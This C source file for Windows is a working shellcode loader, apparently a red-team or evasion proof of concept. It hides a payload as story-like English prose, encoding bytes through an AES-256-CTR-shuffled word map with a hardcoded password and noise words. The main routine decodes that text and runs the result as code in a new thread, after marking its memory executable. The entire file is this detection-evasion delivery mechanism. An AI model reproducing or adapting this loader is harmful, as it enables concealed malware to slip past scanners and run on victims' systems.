#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#ifndef CRYPT_MODE_CTR
#define CRYPT_MODE_CTR 4
#endif

#define MAX_WORD_LEN       64
#define MAX_WORDS          256
#define MAX_SHELLCODE_SIZE 65536
#define MAX_NOISE_WORDS    128
#define AES_BLOCK_SIZE     16

const char* TOKEN_SEP = " \t\n\r,.;:!?()[]{}\"'-";

typedef struct {
    size_t bytes_out;
    int codewords;
    int noise_skipped;
    int empty_skipped;
} DecryptStats;

typedef enum { CIPHER_AES = 1 } CipherMode;

static DWORD g_last_aes_error = 0;

static char g_words[MAX_WORDS][MAX_WORD_LEN];
static const char* g_byte_to_word[256];
static unsigned char g_shuffled_opcodes[256];

static char g_lookup_words[256][MAX_WORD_LEN];
static unsigned char g_lookup_bytes[256];
static int g_lookup_count = 0;

CipherMode g_cipher_mode = CIPHER_AES;
int g_num_safe_connectors = 0;

static const char* natural_words[] = {
    "the", "be", "to", "of", "and", "a", "in", "that", "have", "i", "it", "for", "not", "on", "with", "he",
    "as", "you", "do", "at", "this", "but", "his", "by", "from", "they", "we", "say", "her", "she", "or", "an",
    "will", "my", "one", "all", "would", "there", "their", "what", "so", "up", "out", "if", "about", "who", "get", "which",
    "go", "me", "when", "make", "can", "like", "time", "no", "just", "him", "know", "take", "people", "into", "year", "your",
    "good", "some", "could", "them", "see", "other", "than", "then", "now", "look", "only", "come", "its", "over", "think", "also",
    "back", "after", "use", "two", "how", "our", "work", "first", "well", "way", "even", "new", "want", "because", "any", "these",
    "give", "day", "most", "us", "water", "sun", "moon", "star", "sky", "cloud", "rain", "wind", "snow", "ice", "fire", "earth",
    "tree", "flower", "grass", "leaf", "plant", "bird", "fish", "animal", "cat", "dog", "horse", "cow", "pig", "chicken", "duck", "goose",
    "rabbit", "mouse", "house", "home", "room", "door", "window", "wall", "floor", "ceiling", "roof", "garden", "happy", "sad", "angry", "calm",
    "peace", "love", "hate", "joy", "fear", "hope", "dream", "sleep", "wake", "night", "day", "morning", "evening", "noon", "midnight", "dawn",
    "red", "blue", "green", "yellow", "black", "white", "purple", "orange", "pink", "brown", "big", "small", "large", "tiny", "huge", "little",
    "fast", "slow", "quick", "rapid", "steady", "wild", "tame", "soft", "hard", "hot", "cold", "warm", "cool", "dry", "wet", "clean",
    "dirty", "old", "young", "new", "ancient", "modern", "early", "late", "final", "first", "last", "next", "same", "different", "simple", "complex",
    "easy", "real", "fake", "true", "false", "right", "wrong", "correct", "proper", "public", "private", "open", "closed", "free", "busy",
    "full", "empty", "complete", "total", "whole", "partial", "broken", "fixed", "beautiful", "ugly", "pretty", "lovely", "wonderful", "terrible", "excellent", "perfect"
};
static const int num_natural_words = (int)(sizeof(natural_words) / sizeof(natural_words[0]));

static const char* connector_candidates[] = {
    "however", "therefore", "although", "whereas", "moreover", "furthermore", "nevertheless",
    "meanwhile", "indeed", "basically", "obviously", "certainly", "probably", "perhaps",
    "specifically", "particularly", "especially", "importantly", "notably", "initially",
    "originally", "previously", "subsequently", "recently", "currently", "eventually",
    "immediately", "indirectly", "similarly", "differently", "otherwise", "anyhow",
    "elsewhere", "everywhere", "somewhere", "anywhere", "nowhere", "likewise",
    "nonetheless", "regardless", "consequently", "accordingly", "alternatively",
    "additionally", "equally", "namely", "chiefly", "mainly", "mostly", "partly"
};
static const int num_connector_candidates = (int)(sizeof(connector_candidates) / sizeof(connector_candidates[0]));

static const char* g_safe_connectors[MAX_NOISE_WORDS];

static int word_in_pool(const char* word, int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(g_words[i], word) == 0) return 1;
    }
    return 0;
}

static char* duplicate_string(const char* s) {
    if (!s) return NULL;
    size_t len = strlen(s);
    char* copy = (char*)malloc(len + 1);
    if (copy) strcpy(copy, s);
    return copy;
}

static void clean_alpha_token(const char* token, char* clean, size_t clean_sz) {
    size_t j = 0;
    for (size_t i = 0; token[i] && j + 1 < clean_sz; i++) {
        if (isalpha((unsigned char)token[i]))
            clean[j++] = (char)tolower((unsigned char)token[i]);
    }
    clean[j] = '\0';
}

static int extract_unique_words(const char* sentence) {
    char* copy = duplicate_string(sentence);
    if (!copy) return 0;

    int count = 0;
    char* tok = strtok(copy, TOKEN_SEP);
    while (tok && count < MAX_WORDS) {
        char clean[MAX_WORD_LEN];
        clean_alpha_token(tok, clean, sizeof(clean));
        if (clean[0] != '\0' && !word_in_pool(clean, count)) {
            strcpy(g_words[count], clean);
            count++;
        }
        tok = strtok(NULL, TOKEN_SEP);
    }
    int truncated = (tok != NULL);
    free(copy);
    if (truncated)
        printf("[!] Warning: sentence has more than %d unique words; extras ignored.\n", MAX_WORDS);
    return count;
}

static void add_natural_padding(int current) {
    int idx = 0;
    for (int i = current; i < MAX_WORDS; i++) {
        char candidate[MAX_WORD_LEN];
        int attempts = 0;
        for (;;) {
            strcpy(candidate, natural_words[idx % num_natural_words]);
            idx++;
            if (!word_in_pool(candidate, i)) break;
            if (++attempts > num_natural_words + 64) {
                snprintf(candidate, sizeof(candidate), "pad%03d", i);
                if (!word_in_pool(candidate, i)) break;
            }
        }
        strcpy(g_words[i], candidate);
    }
}

static int aes_ctr_keystream(const char* password, unsigned char* output, int bytes_needed) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    int ok = 0;
    g_last_aes_error = 0;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        g_last_aes_error = GetLastError();
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
            g_last_aes_error = GetLastError();
            return 0;
        }
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        g_last_aes_error = GetLastError();
        goto cleanup;
    }
    if (!CryptHashData(hHash, (const BYTE*)password, (DWORD)strlen(password), 0)) {
        g_last_aes_error = GetLastError();
        goto cleanup;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        g_last_aes_error = GetLastError();
        goto cleanup;
    }

    {
        DWORD mode = CRYPT_MODE_CTR;
        BYTE counter[16] = { 0 };

        if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
            g_last_aes_error = GetLastError();
            goto cleanup;
        }
        if (!CryptSetKeyParam(hKey, KP_IV, counter, 0)) {
            g_last_aes_error = GetLastError();
            goto cleanup;
        }

        DWORD data_len = (DWORD)bytes_needed;
        DWORD buf_size = data_len + AES_BLOCK_SIZE;
        BYTE* buffer = (BYTE*)calloc(1, buf_size);
        if (!buffer) {
            g_last_aes_error = ERROR_NOT_ENOUGH_MEMORY;
            goto cleanup;
        }

        if (CryptEncrypt(hKey, 0, TRUE, 0, buffer, &data_len, buf_size)) {
            memcpy(output, buffer, (size_t)bytes_needed);
            ok = 1;
        }
        else {
            g_last_aes_error = GetLastError();
        }
        free(buffer);
    }

cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    return ok;
}

static void generate_shuffled_opcodes_aes(const char* password) {
    unsigned char keystream[256];
    if (!aes_ctr_keystream(password, keystream, 256)) {
        printf("ERROR: AES-256-CTR keystream failed (Win32 error %lu).\n",
            (unsigned long)g_last_aes_error);
        exit(EXIT_FAILURE);
    }
    for (int i = 0; i < 256; i++) g_shuffled_opcodes[i] = (unsigned char)i;
    for (int i = 255; i > 0; i--) {
        int j = keystream[255 - i] % (i + 1);
        unsigned char t = g_shuffled_opcodes[i];
        g_shuffled_opcodes[i] = g_shuffled_opcodes[j];
        g_shuffled_opcodes[j] = t;
    }
}

static void create_byte_to_word_map(void) {
    for (int i = 0; i < 256; i++) g_byte_to_word[i] = NULL;
    for (int pos = 0; pos < 256; pos++) {
        unsigned char b = g_shuffled_opcodes[pos];
        g_byte_to_word[b] = g_words[pos];
    }
}

static void build_reverse_lookup(void) {
    g_lookup_count = 0;
    for (int pos = 0; pos < 256; pos++) {
        strcpy(g_lookup_words[g_lookup_count], g_words[pos]);
        g_lookup_bytes[g_lookup_count] = g_shuffled_opcodes[pos];
        g_lookup_count++;
    }
}

static int lookup_codeword(const char* word, unsigned char* out_byte) {
    if (!word || !word[0]) return 0;
    for (int i = 0; i < g_lookup_count; i++) {
        if (strcmp(word, g_lookup_words[i]) == 0) {
            *out_byte = g_lookup_bytes[i];
            return 1;
        }
    }
    return 0;
}

static void build_safe_noise_lists(void) {
    g_num_safe_connectors = 0;
    for (int i = 0; i < num_connector_candidates && g_num_safe_connectors < MAX_NOISE_WORDS; i++) {
        unsigned char dummy;
        if (!lookup_codeword(connector_candidates[i], &dummy))
            g_safe_connectors[g_num_safe_connectors++] = connector_candidates[i];
    }
}

static int init_word_mapping(const char* sentence, const char* password) {
    int count = extract_unique_words(sentence);
    if (count <= 0) return 0;
    if (count < MAX_WORDS) add_natural_padding(count);
    if (strlen(password) < 4) return 0;
    g_cipher_mode = CIPHER_AES;
    generate_shuffled_opcodes_aes(password);
    create_byte_to_word_map();
    build_reverse_lookup();
    build_safe_noise_lists();
    return 1;
}

static size_t decrypt_shellcode(const char* text, unsigned char** output, int verbose, DecryptStats* stats) {
    if (!text || !output || !stats) return 0;

    *output = (unsigned char*)malloc(MAX_SHELLCODE_SIZE);
    if (!*output) return 0;
    memset(stats, 0, sizeof(*stats));

    char* copy = duplicate_string(text);
    if (!copy) { free(*output); *output = NULL; return 0; }

    size_t out_pos = 0;
    char* tok = strtok(copy, TOKEN_SEP);

    while (tok) {
        if (out_pos >= MAX_SHELLCODE_SIZE) break;

        char clean[MAX_WORD_LEN];
        clean_alpha_token(tok, clean, sizeof(clean));

        if (clean[0] == '\0') {
            stats->empty_skipped++;
            tok = strtok(NULL, TOKEN_SEP);
            continue;
        }

        unsigned char byte_val;
        if (lookup_codeword(clean, &byte_val)) {
            (*output)[out_pos++] = byte_val;
            stats->codewords++;
            if (verbose && out_pos <= 32)
                printf("  [%3zu] %-20s -> 0x%02X\n", out_pos, clean, byte_val);
        }
        else {
            stats->noise_skipped++;
            if (verbose && stats->noise_skipped <= 20)
                printf("  [noise] %s\n", clean);
        }

        tok = strtok(NULL, TOKEN_SEP);
    }

    stats->bytes_out = out_pos;
    free(copy);
    return out_pos;
}

static int is_printable_text(const unsigned char* data, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        unsigned char c = data[i];
        if (c == '\n' || c == '\r' || c == '\t') continue;
        if (!isprint(c)) return 0;
    }
    return 1;
}

static void wait_for_enter(const char* prompt) {
    if (prompt && prompt[0]) printf("%s", prompt);
    fflush(stdout);
    int ch = getchar();
    if (ch != '\n') {
        while (ch != EOF && ch != '\n') ch = getchar();
    }
}

static const char* secret_sentence =
"The old lighthouse keeper had not seen another human face in over seven years, not since the strange fog rolled in from the sea and never left. "
"Every morning he climbed the spiral staircase with a bucket of oil and a prayer on his lips, polishing the great lens until it shone like a dying star. "
"The birds had stopped coming long ago, and the fish had vanished from the waters below, leaving only silence and the constant moan of waves against broken stone. "
"One night he found a bottle washed up on the rocky shore, sealed with red wax and containing a map drawn on leather. "
"The map showed an island that did not exist, marked with a single word written in faded ink: Eden. "
"He laughed at first, thinking it was a prank or a ghost story, but something in his chest ached with a hope he had buried years ago. "
"So he packed a bag with dried meat, fresh water, a compass that spun in circles, and the old revolver his father had used in the war. "
"He stepped into a rowboat as the sun bled orange and purple across the horizon, pushing off without looking back. "
"The fog swallowed him whole, and for three days he saw nothing but gray mist and his own trembling hands. "
"On the fourth morning he woke to the sound of bells ringing softly in the distance, and the air smelled of honey and rain. "
"Before him stood a forest where the trees had silver leaves and the grass sparkled like broken glass. "
"A path of white stones led into the shadows, and at the end of that path waited something he could not name but had always known. "
"He whispered a prayer to no god in particular, took a deep breath, and stepped forward into the impossible.";

static const char* password = "nirvana";

static const char* ciphertext =
"Accordingly, polishing her found differently time faded, used recently she if, recently if. notably If woke looking nevertheless woke fresh, mainly on looking years her strange. Chiefly, you buried similarly her fog otherwise on, indirectly after her fog on, recently impossible originally her regardless fog on. Importantly, first her furthermore fog but, fresh her want, trees since, alternatively since probably ink strange red, mainly her strange.\n"
"\n"
" She keeper mostly from use, bled how these perhaps first woke, currently god. Red our woke mainly softly god, spun probably distance although on partly woke looking, chiefly her fog? On first fog seven from, her softly of. Fog compass moan, everywhere if, nowhere if, mostly if her leaves!\n"
"\n"
" Probably, she broken constant her softly of, fresh fog nonetheless her impossible, regardless can fog. Mainly, stood first everywhere me, consequently softly of importantly this years her, bells. Namely, red woke perhaps fog anyhow another moan, probably her softly get ink? Strange red alternatively her somewhere strange, she keeper woke god red, our woke regardless softly god other could.\n"
"\n"
" Star be bottle because bottle, what stones took great days, star eden their? Likewise, can fog stood what, notably me basically softly of, path woke importantly fog, think her can whereas fog, moreover stood. Two me softly previously of woke, regardless fog everywhere where moan, her softly of. Anyhow, woke their woke, their fish fourth, written woke.\n"
"\n"
" Otherwise, their woke fourth, therefore woke written her specifically found, specifically they first. Obviously, woke on bells probably could their, woke fourth written her fog prank. Forward shore bells, certainly bells, otherwise bells before her, own softly if, whereas if. eventually If, regardless if, although if, partly if, although if her something, elsewhere something specifically softly, mostly softly.\n"
"\n"
" If, nonetheless if woke chiefly own, strange fog night notably had bells, mostly ago them recently faded know whole, especially years. Nevertheless, woke own chiefly look for dying, his bells previously ago her, found leaving. Equally, rain from known bled come, compass rocky notably could likewise star, father them silence, until. Alternatively, but night white if partly fourth woke, stopped elsewhere now bells ago.\n"
"\n"
" Seen use my, seen who buried prayer, buried especially if.";


int main(void) {
    printf("=== NØW AES-256-CTR Decryptor ===\n");
    printf("AES-256-CTR | SHA-256 key derivation | Word-based steganography\n\n");

    if (!init_word_mapping(secret_sentence, password)) {
        fprintf(stderr, "Failed to initialize word mapping.\n");
        return EXIT_FAILURE;
    }
    printf("[+] Word mapping initialized (AES-256-CTR | 256 unique words)\n");
    printf("[+] Safe connectors available: %d\n", g_num_safe_connectors);

    wait_for_enter("\nPress <Enter> to allocate ciphertext buffer...\n");

    char* ciphertext_buf = (char*)malloc(strlen(ciphertext) + 1);
    if (!ciphertext_buf) {
        fprintf(stderr, "Failed to allocate ciphertext buffer.\n");
        return EXIT_FAILURE;
    }
    strcpy(ciphertext_buf, ciphertext);
    printf("[+] Allocated ciphertext buffer at %p (%zu bytes)\n",
        (void*)ciphertext_buf, strlen(ciphertext));

    wait_for_enter("\nPress <Enter> to decrypt payload...\n");

    unsigned char* decoded = NULL;
    DecryptStats stats;
    size_t decoded_len = decrypt_shellcode(ciphertext_buf, &decoded, 1, &stats);
    free(ciphertext_buf);
    ciphertext_buf = NULL;

    if (decoded_len == 0 || decoded == NULL) {
        fprintf(stderr, "Decryption failed or produced no output.\n");
        free(decoded);
        return EXIT_FAILURE;
    }

    printf("\n[+] Decoded %llu bytes (codewords=%d, noise_skipped=%d).\n\n",
        (unsigned long long)decoded_len, stats.codewords, stats.noise_skipped);

    if (is_printable_text(decoded, decoded_len)) {
        wait_for_enter("Press <Enter> to display decoded text...\n");
        printf("\n=== Decoded Text ===\n%.*s\n", (int)decoded_len, decoded);
        free(decoded);
        return EXIT_SUCCESS;
    }

    wait_for_enter("\nPress <Enter> to allocate executable memory...\n");

    void* exec_mem = VirtualAlloc(NULL, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        fprintf(stderr, "VirtualAlloc failed: %lu\n", GetLastError());
        free(decoded);
        return EXIT_FAILURE;
    }
    printf("[+] Allocated address at 0x%p of size %zu\n", exec_mem, decoded_len);

    wait_for_enter("\nPress <Enter> to copy payload into executable memory...\n");
    memcpy(exec_mem, decoded, decoded_len);
    printf("\t[+] Payload copied from decoded buffer to %p\n", exec_mem);

    printf("\t[i] Setting executable permissions... ");
    DWORD old_protect = 0;
    if (!VirtualProtect(exec_mem, decoded_len, PAGE_EXECUTE_READ, &old_protect)) {
        printf("FAILED\n");
        fprintf(stderr, "VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        free(decoded);
        return EXIT_FAILURE;
    }
    printf("DONE\n");

    wait_for_enter("\nPress <Enter> to run the payload...\n");
    printf("\t[i] Running payload at entry 0x%p...\n\n", exec_mem);

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!thread) {
        fprintf(stderr, "CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        free(decoded);
        return EXIT_FAILURE;
    }

    printf("[+] Thread created with id: %u\n", GetThreadId(thread));
    WaitForSingleObject(thread, 5000);
    CloseHandle(thread);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(decoded);
    return EXIT_SUCCESS;
}
